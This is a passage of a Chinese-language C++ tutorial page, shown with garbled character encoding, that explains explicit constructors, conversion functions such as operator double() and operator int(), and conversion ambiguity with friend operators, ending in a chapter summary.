class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main.cpp (ä½¿ç”¨ explicit Stones å)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Stones incognito = 275; // é”™è¯¯ï¼ä¸èƒ½éšå¼è½¬æ¢</span></span><br><span class="line">    <span class="comment">// Stones taft = 325;      // é”™è¯¯ï¼ä¸èƒ½éšå¼è½¬æ¢</span></span><br><span class="line"></span><br><span class="line">    <span class="function">Stones <span class="title">wolfe</span><span class="params">(<span class="number">285.7</span>)</span></span>;    <span class="comment">// OK: æ˜¾å¼è°ƒç”¨æ„é€ å‡½æ•°</span></span><br><span class="line">    Stones incognito = Stones(<span class="number">275</span>); <span class="comment">// OK: æ˜¾å¼è½¬æ¢ (è°ƒç”¨æ„é€ å‡½æ•°)</span></span><br><span class="line">    <span class="function">Stones <span class="title">taft</span><span class="params">(<span class="number">325</span>)</span></span>;      <span class="comment">// OK: æ˜¾å¼è°ƒç”¨æ„é€ å‡½æ•°</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// incognito = 276.8; // é”™è¯¯ï¼ä¸èƒ½éšå¼è½¬æ¢åèµ‹å€¼</span></span><br><span class="line">    incognito = Stones(<span class="number">276.8</span>); <span class="comment">// OK: æ˜¾å¼è½¬æ¢åèµ‹å€¼</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// display(19.99, 2); // é”™è¯¯ï¼ä¸èƒ½éšå¼è½¬æ¢å‚æ•°</span></span><br><span class="line">    display(Stones(<span class="number">19.99</span>), <span class="number">2</span>); <span class="comment">// OK: æ˜¾å¼è½¬æ¢å‚æ•°</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¼ºåˆ¶ç±»å‹è½¬æ¢ä¹Ÿå…è®¸</span></span><br><span class="line">    display((Stones)<span class="number">20.5</span>, <span class="number">1</span>); <span class="comment">// C é£æ ¼å¼ºåˆ¶è½¬æ¢</span></span><br><span class="line">    display(<span class="keyword">static_cast</span>&lt;Stones&gt;(<span class="number">21.2</span>), <span class="number">1</span>); <span class="comment">// C++ é£æ ¼å¼ºåˆ¶è½¬æ¢</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>å»ºè®®:</strong> é€šå¸¸å»ºè®®å°†<strong>åªæ¥å—ä¸€ä¸ªå‚æ•°çš„æ„é€ å‡½æ•°</strong>å£°æ˜ä¸º <code>explicit</code>ï¼Œé™¤éä½ ç¡®å®å¸Œæœ›è¿›è¡Œè¯¥ç±»å‹çš„éšå¼è½¬æ¢ã€‚è¿™å¯ä»¥é˜²æ­¢è®¸å¤šæ½œåœ¨çš„é”™è¯¯ã€‚</p><h3 id="11-6-2-è½¬æ¢å‡½æ•°ï¼šoperator-typeName"><a href="#11-6-2-è½¬æ¢å‡½æ•°ï¼šoperator-typeName" class="headerlink" title="11.6.2 è½¬æ¢å‡½æ•°ï¼šoperator typeName()"></a>11.6.2 è½¬æ¢å‡½æ•°ï¼š<code>operator typeName()</code></h3><p>æ„é€ å‡½æ•°æä¾›äº†ä»å…¶ä»–ç±»å‹åˆ°ç±»ç±»å‹çš„è½¬æ¢ã€‚å¦‚æœæˆ‘ä»¬æƒ³å®šä¹‰ä»<strong>ç±»ç±»å‹</strong>è½¬æ¢åˆ°<strong>å…¶ä»–ç±»å‹</strong>ï¼ˆå¦‚ <code>double</code> æˆ– <code>int</code>ï¼‰çš„è§„åˆ™ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨**è½¬æ¢å‡½æ•° (Conversion Function)**ã€‚</p><p>è½¬æ¢å‡½æ•°æ˜¯ä¸€ç§ç‰¹æ®Šçš„ç±»æˆå‘˜å‡½æ•°ï¼Œå½¢å¼ä¸º <code>operator typeName()</code>ã€‚</p><p><strong>ç‰¹ç‚¹:</strong></p><ol><li> <strong>åç§°:</strong> <code>operator</code> å…³é”®å­—åè·Ÿç›®æ ‡ç±»å‹å <code>typeName</code>ã€‚</li><li> <strong>æ— è¿”å›ç±»å‹å£°æ˜:</strong> å‡½æ•°å¤´ä¸èƒ½æŒ‡å®šè¿”å›ç±»å‹ï¼ˆå³ä½¿å®ƒç¡®å®ä¼šè¿”å›ä¸€ä¸ª <code>typeName</code> ç±»å‹çš„å€¼ï¼‰ã€‚</li><li> <strong>æ— å‚æ•°:</strong> è½¬æ¢å‡½æ•°å¿…é¡»æ˜¯<strong>æ²¡æœ‰å‚æ•°</strong>çš„æˆå‘˜å‡½æ•°ã€‚</li><li> <strong>å¿…é¡»æ˜¯æˆå‘˜å‡½æ•°:</strong> ä¸èƒ½æ˜¯é™æ€æˆå‘˜å‡½æ•°æˆ–å‹å…ƒå‡½æ•°ã€‚</li></ol><p><strong>ç¤ºä¾‹ï¼šä¸º <code>Stones</code> æ·»åŠ è½¬æ¢ä¸º <code>double</code> å’Œ <code>int</code> çš„å‡½æ•°</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// stones.h (æ·»åŠ è½¬æ¢å‡½æ•°)</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stones</span> &#123;</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">Stones</span><span class="params">(<span class="keyword">double</span> lbs)</span></span>;</span><br><span class="line">    Stones();</span><br><span class="line">    ~Stones();</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">show_lbs</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">show_stn</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è½¬æ¢å‡½æ•°ï¼šè½¬æ¢ä¸º double (æ€»ç£…æ•°)</span></span><br><span class="line">    <span class="function"><span class="keyword">operator</span> <span class="title">double</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">    <span class="comment">// è½¬æ¢å‡½æ•°ï¼šè½¬æ¢ä¸º int (å››èˆäº”å…¥çš„æ€»ç£…æ•°)</span></span><br><span class="line">    <span class="function"><span class="keyword">operator</span> <span class="title">int</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// stones.cpp (æ·»åŠ è½¬æ¢å‡½æ•°å®šä¹‰)</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="function">Stones::<span class="keyword">operator</span> <span class="title">double</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> pounds; <span class="comment">// è¿”å›æ€»ç£…æ•°</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Stones::<span class="keyword">operator</span> <span class="title">int</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="comment">// å››èˆäº”å…¥åˆ°æœ€è¿‘çš„æ•´æ•°ç£…</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">int</span>(pounds + <span class="number">0.5</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// main.cpp (ä½¿ç”¨è½¬æ¢å‡½æ•°)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stones.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function">Stones <span class="title">poppins</span><span class="params">(<span class="number">9</span>, <span class="number">2.8</span>)</span></span>; <span class="comment">// 9 stone, 2.8 pounds</span></span><br><span class="line">    <span class="keyword">double</span> p_wt = poppins; <span class="comment">// éšå¼è½¬æ¢: è°ƒç”¨ poppins.operator double()</span></span><br><span class="line">    <span class="keyword">int</span> int_wt = poppins;  <span class="comment">// éšå¼è½¬æ¢: è°ƒç”¨ poppins.operator int()</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Poppins weighs &quot;</span> &lt;&lt; p_wt &lt;&lt; <span class="string">&quot; pounds.\n&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Poppins weighs &quot;</span> &lt;&lt; int_wt &lt;&lt; <span class="string">&quot; pounds (rounded).\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä¹Ÿå¯ä»¥æ˜¾å¼è°ƒç”¨</span></span><br><span class="line">    <span class="keyword">double</span> p_wt_explicit = <span class="keyword">double</span>(poppins);</span><br><span class="line">    <span class="keyword">int</span> int_wt_explicit = <span class="keyword">int</span>(poppins);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Explicit double: &quot;</span> &lt;&lt; p_wt_explicit &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Explicit int: &quot;</span> &lt;&lt; int_wt_explicit &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>è¾“å‡º:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Poppins weighs 128.8 pounds.</span><br><span class="line">Poppins weighs 129 pounds (rounded).</span><br><span class="line">Explicit double: 128.8</span><br><span class="line">Explicit int: 129</span><br></pre></td></tr></table></figure><p><strong><code>explicit</code> è½¬æ¢å‡½æ•° (C++11)</strong></p><p>ä¸æ„é€ å‡½æ•°ç±»ä¼¼ï¼ŒC++11 å…è®¸å°†è½¬æ¢å‡½æ•°å£°æ˜ä¸º <code>explicit</code>ï¼Œä»¥é˜²æ­¢å®ƒä»¬è¢«ç”¨äºéšå¼è½¬æ¢ã€‚å¦‚æœè½¬æ¢å‡½æ•°æ˜¯ <code>explicit</code> çš„ï¼Œé‚£ä¹ˆåªèƒ½åœ¨éœ€è¦æ˜¾å¼è½¬æ¢çš„ä¸Šä¸‹æ–‡ä¸­ä½¿ç”¨ï¼ˆä¾‹å¦‚ï¼Œä½¿ç”¨ <code>static_cast</code> æˆ–ç›´æ¥åˆå§‹åŒ–ï¼‰ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// stones.h (ä½¿ç”¨ explicit è½¬æ¢å‡½æ•°)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stones</span> &#123;</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="keyword">operator</span> <span class="title">double</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="keyword">operator</span> <span class="title">int</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// main.cpp (ä½¿ç”¨ explicit è½¬æ¢å‡½æ•°å)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function">Stones <span class="title">poppins</span><span class="params">(<span class="number">9</span>, <span class="number">2.8</span>)</span></span>;</span><br><span class="line">    <span class="comment">// double p_wt = poppins; // é”™è¯¯ï¼ä¸èƒ½éšå¼è½¬æ¢</span></span><br><span class="line">    <span class="comment">// int int_wt = poppins;  // é”™è¯¯ï¼ä¸èƒ½éšå¼è½¬æ¢</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// éœ€è¦æ˜¾å¼è½¬æ¢</span></span><br><span class="line">    <span class="keyword">double</span> p_wt = <span class="keyword">static_cast</span>&lt;<span class="keyword">double</span>&gt;(poppins);</span><br><span class="line">    <span class="keyword">int</span> int_wt = <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(poppins);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Poppins weighs &quot;</span> &lt;&lt; p_wt &lt;&lt; <span class="string">&quot; pounds.\n&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Poppins weighs &quot;</span> &lt;&lt; int_wt &lt;&lt; <span class="string">&quot; pounds (rounded).\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if (poppins) &#123; ... &#125; // å¦‚æœ operator bool() æ˜¯ explicitï¼Œè¿™é‡Œä¹Ÿä¼šæŠ¥é”™</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">static_cast</span>&lt;<span class="keyword">bool</span>&gt;(poppins)) &#123; <span class="comment">/* ... */</span> &#125; <span class="comment">// éœ€è¦æ˜¾å¼è½¬æ¢</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°†è½¬æ¢å‡½æ•°è®¾ä¸º <code>explicit</code> é€šå¸¸ä¹Ÿæ˜¯ä¸€ä¸ªå¥½ä¸»æ„ï¼Œé™¤ééšå¼è½¬æ¢ç¡®å®æ˜¯ä½ æƒ³è¦çš„è¡Œä¸ºï¼ˆä¾‹å¦‚ <code>operator bool()</code> åœ¨æ¡ä»¶è¯­å¥ä¸­çš„ä½¿ç”¨ï¼Œä½†åœ¨ C++11 åä¹Ÿæ¨è <code>explicit operator bool()</code>ï¼‰ã€‚</p><h3 id="11-6-3-è½¬æ¢å‡½æ•°å’Œå‹å…ƒå‡½æ•°"><a href="#11-6-3-è½¬æ¢å‡½æ•°å’Œå‹å…ƒå‡½æ•°" class="headerlink" title="11.6.3 è½¬æ¢å‡½æ•°å’Œå‹å…ƒå‡½æ•°"></a>11.6.3 è½¬æ¢å‡½æ•°å’Œå‹å…ƒå‡½æ•°</h3><p>è½¬æ¢å‡½æ•°å’Œæ¥å—å•å‚æ•°çš„æ„é€ å‡½æ•°éƒ½å¯èƒ½å¯¼è‡´äºŒä¹‰æ€§é—®é¢˜ï¼Œå°¤å…¶æ˜¯åœ¨ä¸é‡è½½è¿ç®—ç¬¦ï¼ˆç‰¹åˆ«æ˜¯å‹å…ƒå‡½æ•°ï¼‰ä¸€èµ·ä½¿ç”¨æ—¶ã€‚</p><p><strong>äºŒä¹‰æ€§ç¤ºä¾‹:</strong></p><p>è€ƒè™‘ä¹‹å‰çš„ <code>Vector</code> ç±»å’Œ <code>Vector operator*(double n, const Vector &amp; a);</code> å‹å…ƒå‡½æ•°ã€‚å¦‚æœæˆ‘ä»¬ä¸º <code>Vector</code> æ·»åŠ ä¸€ä¸ªæ¥å— <code>double</code> çš„æ„é€ å‡½æ•°ï¼ˆå¯èƒ½è¡¨ç¤ºåˆ›å»ºä¸€ä¸ªå¤§å°ä¸º <code>double</code>ã€è§’åº¦ä¸º 0 çš„å‘é‡ï¼‰å’Œä¸€ä¸ªè½¬æ¢ä¸º <code>double</code> çš„å‡½æ•°ï¼ˆå¯èƒ½è¿”å›å‘é‡çš„å¤§å° <code>magval()</code>ï¼‰ï¼Œä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vector.h (å‡è®¾æ·»åŠ äº†è½¬æ¢æ„é€ å‡½æ•°å’Œå‡½æ•°)</span></span><br><span class="line"><span class="keyword">namespace</span> VECTOR &#123;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vector</span> &#123;</span></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        Vector(<span class="keyword">double</span> val); <span class="comment">// è½¬æ¢æ„é€ å‡½æ•° (å¯èƒ½ä¸ explicit)</span></span><br><span class="line">        <span class="function"><span class="keyword">operator</span> <span class="title">double</span><span class="params">()</span> <span class="keyword">const</span></span>; <span class="comment">// è½¬æ¢å‡½æ•° (å¯èƒ½ä¸ explicit)</span></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">        <span class="keyword">friend</span> Vector <span class="keyword">operator</span>*(<span class="keyword">double</span> n, <span class="keyword">const</span> Vector &amp; a);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// main.cpp</span></span><br><span class="line">VECTOR::Vector result;</span><br><span class="line"><span class="function">VECTOR::Vector <span class="title">vec</span><span class="params">(<span class="number">10.0</span>, <span class="number">20.0</span>)</span></span>;</span><br><span class="line"><span class="keyword">double</span> factor = <span class="number">2.0</span>;</span><br><span class="line">result = factor * vec; <span class="comment">// æ½œåœ¨çš„äºŒä¹‰æ€§ï¼</span></span><br></pre></td></tr></table></figure><p>ç¼–è¯‘å™¨åœ¨å¤„ç† <code>factor * vec</code> æ—¶ï¼Œå¯èƒ½ä¼šæœ‰ä¸¤ç§è§£é‡Šï¼š</p><ol><li> <strong>è°ƒç”¨å‹å…ƒå‡½æ•°:</strong> <code>operator*(factor, vec)</code>ï¼Œè¿™æ˜¯æˆ‘ä»¬åŸæœ¬æœŸæœ›çš„ã€‚</li><li> <strong>ä½¿ç”¨è½¬æ¢å‡½æ•°:</strong> å°† <code>vec</code> è½¬æ¢ä¸º <code>double</code>ï¼ˆé€šè¿‡ <code>vec.operator double()</code>ï¼‰ï¼Œç„¶åæ‰§è¡Œ <code>double * double</code> çš„å†…ç½®ä¹˜æ³•ã€‚</li></ol><p>å¦‚æœ <code>Vector(double)</code> å’Œ <code>operator double()</code> éƒ½å­˜åœ¨ä¸”éƒ½ä¸æ˜¯ <code>explicit</code>ï¼Œç¼–è¯‘å™¨é€šå¸¸ä¼šå› ä¸ºæ— æ³•ç¡®å®šä½¿ç”¨å“ªä¸ªè½¬æ¢è·¯å¾„è€ŒæŠ¥å‘Š**äºŒä¹‰æ€§é”™è¯¯ (ambiguity error)**ã€‚</p><p><strong>è§£å†³æ–¹æ³•:</strong></p><ol><li> <strong>ä½¿ç”¨ <code>explicit</code>:</strong> å°†è½¬æ¢æ„é€ å‡½æ•°å’Œè½¬æ¢å‡½æ•°å£°æ˜ä¸º <code>explicit</code>ï¼Œå¯ä»¥æ¶ˆé™¤éšå¼è½¬æ¢å¸¦æ¥çš„äºŒä¹‰æ€§ã€‚ç”¨æˆ·å¿…é¡»æ˜¾å¼æŒ‡å®šè½¬æ¢ã€‚</li><li> <strong>æä¾›ç²¾ç¡®åŒ¹é…çš„å‡½æ•°:</strong> å¦‚æœåªæä¾›äº† <code>operator*(double, const Vector&amp;)</code>ï¼Œè€Œæ²¡æœ‰æä¾› <code>operator double()</code>ï¼Œé‚£ä¹ˆç¼–è¯‘å™¨ä¼šä¼˜å…ˆé€‰æ‹©ç²¾ç¡®åŒ¹é…çš„å‹å…ƒå‡½æ•°ï¼Œä¸ä¼šäº§ç”ŸäºŒä¹‰æ€§ã€‚</li><li> <strong>é¿å…å®šä¹‰ç›¸äº’å†²çªçš„è½¬æ¢:</strong> åœ¨è®¾è®¡ç±»æ—¶ï¼Œä»”ç»†è€ƒè™‘å¯èƒ½éœ€è¦çš„è½¬æ¢ï¼Œé¿å…åŒæ—¶æä¾›ä»ç±»å‹ A åˆ°ç±»å‹ B ä»¥åŠä»ç±»å‹ B åˆ°ç±»å‹ A çš„éšå¼è½¬æ¢ï¼Œæˆ–è€…æä¾›å¤šä¸ªå¯èƒ½å¯¼è‡´ç›¸åŒç»“æœçš„è½¬æ¢è·¯å¾„ã€‚</li></ol><p><strong>æ€»ç»“:</strong></p><ul><li>  æ¥å—å•ä¸ªå‚æ•°çš„æ„é€ å‡½æ•°å®šä¹‰äº†ä»å‚æ•°ç±»å‹åˆ°ç±»ç±»å‹çš„éšå¼è½¬æ¢ï¼Œé™¤éä½¿ç”¨ <code>explicit</code> é˜»æ­¢ã€‚</li><li>  è½¬æ¢å‡½æ•° <code>operator typeName()</code> å®šä¹‰äº†ä»ç±»ç±»å‹åˆ° <code>typeName</code> ç±»å‹çš„è½¬æ¢ï¼Œå¯ä»¥æ˜¯éšå¼çš„ï¼Œé™¤éä½¿ç”¨ <code>explicit</code> (C++11) é˜»æ­¢ã€‚</li><li>  éšå¼è½¬æ¢è™½ç„¶æ–¹ä¾¿ï¼Œä½†å¯èƒ½å¯¼è‡´æ„å¤–è¡Œä¸ºå’ŒäºŒä¹‰æ€§ã€‚ä¼˜å…ˆä½¿ç”¨ <code>explicit</code> æ¥æ§åˆ¶è½¬æ¢ã€‚</li><li>  å½“å­˜åœ¨å¤šä¸ªè½¬æ¢è·¯å¾„ï¼ˆé€šè¿‡æ„é€ å‡½æ•°æˆ–è½¬æ¢å‡½æ•°ï¼‰å¯ä»¥ä½¿è¡¨è¾¾å¼åˆæ³•æ—¶ï¼Œç¼–è¯‘å™¨å¯èƒ½ä¼šé‡åˆ°äºŒä¹‰æ€§é—®é¢˜ã€‚</li><li>  åœ¨è®¾è®¡ç±»æ—¶ï¼Œåº”è°¨æ…è€ƒè™‘è½¬æ¢éœ€æ±‚ï¼Œé¿å…å¼•å…¥ä¸å¿…è¦çš„æˆ–æœ‰æ­§ä¹‰çš„è½¬æ¢è§„åˆ™ã€‚</li></ul><h2 id="11-7-æ€»ç»“"><a href="#11-7-æ€»ç»“" class="headerlink" title="11.7 æ€»ç»“"></a>11.7 æ€»ç»“</h2><p>æœ¬ç« é‡ç‚¹ä»‹ç»äº†å¦‚ä½•é€šè¿‡è¿ç®—ç¬¦é‡è½½ã€å‹å…ƒå’Œç±»å‹è½¬æ¢ç­‰ç‰¹æ€§æ¥æ‰©å±•ç±»çš„åŠŸèƒ½ï¼Œä½¿å…¶ä½¿ç”¨èµ·æ¥æ›´è‡ªç„¶ã€æ›´å¼ºå¤§ã€‚</p><p>ä¸»è¦å†…å®¹å›é¡¾ï¼š</p><ol><li><p><strong>è¿ç®—ç¬¦é‡è½½ (Operator Overloading):</strong></p><ul><li>  å…è®¸ä¸ºç±»å®šä¹‰æ ‡å‡† C++ è¿ç®—ç¬¦ï¼ˆå¦‚ <code>+</code>, <code>-</code>, <code>*</code>, <code>&lt;&lt;</code>ï¼‰çš„è¡Œä¸ºã€‚</li><li>  ç›®çš„æ˜¯æé«˜ä»£ç çš„å¯è¯»æ€§å’Œç›´è§‚æ€§ï¼Œä½¿ç±»å¯¹è±¡çš„è¿ç®—ç±»ä¼¼äºå†…ç½®ç±»å‹ã€‚</li><li>  é€šè¿‡å®šä¹‰<strong>è¿ç®—ç¬¦å‡½æ•°</strong>ï¼ˆ<code>operator+</code>, <code>operator&lt;&lt;</code> ç­‰ï¼‰æ¥å®ç°ã€‚</li><li>  è¿ç®—ç¬¦å‡½æ•°å¯ä»¥æ˜¯<strong>æˆå‘˜å‡½æ•°</strong>æˆ–<strong>éæˆå‘˜å‡½æ•°</strong>ï¼ˆé€šå¸¸æ˜¯å‹å…ƒï¼‰ã€‚</li><li>  é‡è½½ä¸èƒ½æ”¹å˜è¿ç®—ç¬¦çš„ä¼˜å…ˆçº§ã€ç»“åˆæ€§æˆ–æ“ä½œæ•°ä¸ªæ•°ï¼Œä¹Ÿä¸èƒ½åˆ›å»ºæ–°è¿ç®—ç¬¦ã€‚æŸäº›è¿ç®—ç¬¦ï¼ˆå¦‚ <code>.</code>ã€<code>::</code>ã€<code>sizeof</code>ï¼‰ä¸èƒ½è¢«é‡è½½ã€‚</li><li>  <code>Time</code> ç±»çš„ç¤ºä¾‹æ¼”ç¤ºäº†å¦‚ä½•é‡è½½ <code>+</code>, <code>-</code>, <code>*</code> ç­‰ç®—æœ¯è¿ç®—ç¬¦ã€‚</li></ul></li><li><p><strong>å‹å…ƒ (Friends):</strong></p><ul><li>  å…è®¸éæˆå‘˜å‡½æ•°æˆ–æ•´ä¸ªç±»è®¿é—®å¦ä¸€ä¸ªç±»çš„ <code>private</code> å’Œ <code>protected</code> æˆå‘˜ã€‚</li><li>  é€šè¿‡åœ¨ç±»å®šä¹‰å†…éƒ¨ä½¿ç”¨ <code>friend</code> å…³é”®å­—å£°æ˜ã€‚</li><li>  <strong>å‹å…ƒå‡½æ•°</strong>å¸¸ç”¨äºé‡è½½é‚£äº›ä¸èƒ½ä½œä¸ºæˆå‘˜å‡½æ•°ï¼ˆå¦‚ <code>&lt;&lt;</code>, <code>&gt;&gt;</code>ï¼‰æˆ–éœ€è¦å¯¹ç§°å¤„ç†æ“ä½œæ•°ï¼ˆå¦‚ <code>double * Vector</code>ï¼‰çš„è¿ç®—ç¬¦ã€‚</li><li>  <strong>å‹å…ƒç±»</strong>å…è®¸ä¸€ä¸ªç±»çš„æ‰€æœ‰æˆå‘˜å‡½æ•°è®¿é—®å¦ä¸€ä¸ªç±»çš„ç§æœ‰éƒ¨åˆ†ï¼Œé€‚ç”¨äºéœ€è¦ç´§å¯†åä½œçš„ç±»ã€‚</li></ul></li><li><p><strong>æˆå‘˜å‡½æ•° vs. éæˆå‘˜å‡½æ•° (Operator Overloading Choice):</strong></p><ul><li>  èµ‹å€¼ (<code>=</code>)ã€ä¸‹æ ‡ (<code>[]</code>)ã€å‡½æ•°è°ƒç”¨ (<code>()</code>)ã€æˆå‘˜è®¿é—® (<code>-&gt;</code>) è¿ç®—ç¬¦<strong>å¿…é¡»</strong>æ˜¯æˆå‘˜å‡½æ•°ã€‚</li><li>  ä¿®æ”¹å¯¹è±¡çŠ¶æ€çš„è¿ç®—ç¬¦ï¼ˆå¦‚ <code>+=</code>, <code>++</code>ï¼‰é€šå¸¸å®ç°ä¸º<strong>æˆå‘˜å‡½æ•°</strong>ã€‚</li><li>  éœ€è¦å¯¹ç§°æ€§æˆ–å…è®¸å·¦æ“ä½œæ•°è¿›è¡Œç±»å‹è½¬æ¢çš„è¿ç®—ç¬¦ï¼ˆå¦‚ <code>+</code>, <code>*</code>, <code>==</code>ï¼‰ä»¥åŠè¾“å…¥/è¾“å‡ºè¿ç®—ç¬¦ (<code>&lt;&lt;</code>, <code>&gt;&gt;</code>) é€šå¸¸å®ç°ä¸º<strong>éæˆå‘˜å‹å…ƒå‡½æ•°</strong>ã€‚</li></ul></li><li><p><strong><code>Vector</code> ç±»ç¤ºä¾‹:</strong></p><ul><li>  æ¼”ç¤ºäº†å¦‚ä½•è®¾è®¡ä¸€ä¸ªåŒ…å«çŠ¶æ€ï¼ˆç›´è§’/æåæ ‡æ¨¡å¼ï¼‰çš„ç±»ã€‚</li><li>  è¿›ä¸€æ­¥å±•ç¤ºäº†ç®—æœ¯è¿ç®—ç¬¦ (<code>+</code>, <code>-</code>, unary <code>-</code>, <code>*</code>) 